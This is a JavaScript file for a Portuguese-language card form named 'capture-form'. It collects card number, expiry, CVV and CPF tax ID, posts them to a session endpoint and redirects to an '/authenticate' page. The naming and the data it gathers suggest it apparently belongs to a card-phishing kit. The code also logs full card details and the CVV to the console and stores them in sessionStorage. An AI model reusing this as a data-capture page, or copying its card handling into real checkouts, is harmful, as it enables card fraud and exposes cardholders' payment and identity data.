document.addEventListener("DOMContentLoaded", function() {
    document.getElementById('capture-form').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const cardNumberValid = validateCardNumber();
        const expiryDateValid = validateExpiryDate();
        const cvvValid = validateCVV();
        const cpfValid = validateCPF();
        
        const allValid = cardNumberValid && expiryDateValid && cvvValid && cpfValid;
        
        if (!allValid) {
            alert('Por favor, verifique os dados digitados e tente novamente.');
            return;
        }
        
        const cardNumber = document.getElementById('cardNumber').value;
        const cardExpiry = document.getElementById('cardExpiry').value;
        const cardCVV = document.getElementById('cardCVV').value;
        const cardCPF = document.getElementById('cardCPF').value;

        console.log('Sending request to start session...');
        console.log({ cardNumber, cardExpiry, cardCVV, cardCPF });

        fetch('/api/start-session', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ cardNumber, cardExpiry, cardCVV, cardCPF })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Response from server:', data);
            if (data.status === 'success') {
                sessionStorage.setItem('sessionId', data.sessionId);
                sessionStorage.setItem('cardNumber', cardNumber);
                sessionStorage.setItem('cardExpiry', cardExpiry);
                sessionStorage.setItem('cardCVV', cardCVV);
                sessionStorage.setItem('cardCPF', cardCPF);
                window.location.href = `/authenticate`;
            } else {
                alert('Erro ao iniciar sessão.');
            }
        })
        .catch(error => console.error('Error:', error));
    });

    document.getElementById('cardNumber').addEventListener('input', function() {
        formatCardNumber(this);
    });
    
    document.getElementById('cardExpiry').addEventListener('input', function() {
        formatExpiryDate(this);
    });
    
    document.getElementById('cardCVV').addEventListener('input', function() {
        formatCVV(this);
    });
    
    document.getElementById('cardCPF').addEventListener('input', function() {
        formatCPF(this);
    });

    function formatCardNumber(input) {
        input.value = input.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
        showCardIcon(input.value);
        validateCardNumber();
    }

    function formatExpiryDate(input) {
        input.value = input.value.replace(/\D/g, '').replace(/(\d{2})(\d{2})/, '$1/$2').substring(0, 5);
        validateExpiryDate();
    }
    
    function formatCVV(input) {
        input.value = input.value.replace(/\D/g, '').substring(0, 4);
        validateCVV();
    }

    function formatCPF(input) {
        input.value = input.value.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4').substring(0, 14);
        validateCPF();
    }

    function showCardIcon(value) {
        document.getElementById('visa-icon').style.display = value.startsWith('4') ? 'block' : 'none';
        document.getElementById('master-icon').style.display = value.startsWith('5') ? 'block' : 'none';
        document.getElementById('elo-icon').style.display = value.startsWith('6') ? 'block' : 'none';
        document.getElementById('amex-icon').style.display = value.startsWith('3') ? 'block' : 'none';
    }

    function validateCardNumber(showError = true) {
        const input = document.getElementById('cardNumber');
        const value = input.value.replace(/\s/g, '');
        const valid = luhnCheck(value) && (value.length === 16 || value.length === 15); // 15 para Amex
        const errorMessage = document.getElementById('cardNumberError');
        if (!valid && showError) {
            input.parentElement.classList.add('invalid');
            errorMessage.style.display = 'block';
        } else {
            input.parentElement.classList.remove('invalid');
            errorMessage.style.display = 'none';
        }
        return valid;
    }

    function validateExpiryDate(showError = true) {
        const input = document.getElementById('cardExpiry');
        const [month, year] = input.value.split('/').map(num => parseInt(num));
        const now = new Date();
        const valid = (month >= 1 && month <= 12) && (year >= now.getFullYear() % 100) && (year !== now.getFullYear() % 100 || month >= now.getMonth() + 1);
        const errorMessage = document.getElementById('cardExpiryError');
        if (!valid && showError) {
            input.parentElement.classList.add('invalid');
            errorMessage.style.display = 'block';
        } else {
            input.parentElement.classList.remove('invalid');
            errorMessage.style.display = 'none';
        }
        return valid;
    }

    function validateCVV(showError = true) {
        const input = document.getElementById('cardCVV');
        const value = input.value.replace(/\D/g, '');
        const valid = (value.length === 3 || value.length === 4);
        const errorMessage = document.getElementById('cardCVVError');
        if (!valid && showError) {
            input.parentElement.classList.add('invalid');
            errorMessage.style.display = 'block';
        } else {
            input.parentElement.classList.remove('invalid');
            errorMessage.style.display = 'none';
        }
        return valid;
    }

    function validateCPF(showError = true) {
        const input = document.getElementById('cardCPF');
        const value = input.value.replace(/\D/g, '');
        const valid = isValidCPF(value);
        const errorMessage = document.getElementById('cardCPFError');
        if (!valid && showError) {
            input.parentElement.classList.add('invalid');
            errorMessage.style.display = 'block';
        } else {
            input.parentElement.classList.remove('invalid');
            errorMessage.style.display = 'none';
        }
        return valid;
    }

    function luhnCheck(val) {
        let sum = 0;
        let shouldDouble = false;
        for (let i = val.length - 1; i >= 0; i--) {
            let digit = parseInt(val.charAt(i));
            if (shouldDouble) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }
            sum += digit;
            shouldDouble = !shouldDouble;
        }
        return (sum % 10) === 0;
    }

    function isValidCPF(cpf) {
        if (typeof cpf !== "string") return false;
        cpf = cpf.replace(/[\s.-]*/igm, '');
        if (!cpf || cpf.length != 11 || 
            cpf == "00000000000" || 
            cpf == "11111111111" || 
            cpf == "22222222222" || 
            cpf == "33333333333" || 
            cpf == "44444444444" || 
            cpf == "55555555555" || 
            cpf == "66666666666" || 
            cpf == "77777777777" || 
            cpf == "88888888888" || 
            cpf == "99999999999" ) {
            return false;
        }
        let sum = 0;
        let remainder;
        for (let i = 1; i <= 9; i++) 
            sum = sum + parseInt(cpf.substring(i-1, i)) * (11 - i);
        remainder = (sum * 10) % 11;
        if ((remainder == 10) || (remainder == 11))  remainder = 0;
        if (remainder != parseInt(cpf.substring(9, 10)) ) return false;
        sum = 0;
        for (let i = 1; i <= 10; i++) 
            sum = sum + parseInt(cpf.substring(i-1, i)) * (12 - i);
        remainder = (sum * 10) % 11;
        if ((remainder == 10) || (remainder == 11))  remainder = 0;
        if (remainder != parseInt(cpf.substring(10, 11) ) ) return false;
        return true;
    }

    document.addEventListener('input', () => {
        validateCardNumber(false);
        validateExpiryDate(false);
        validateCVV(false);
        validateCPF(false);
    });
});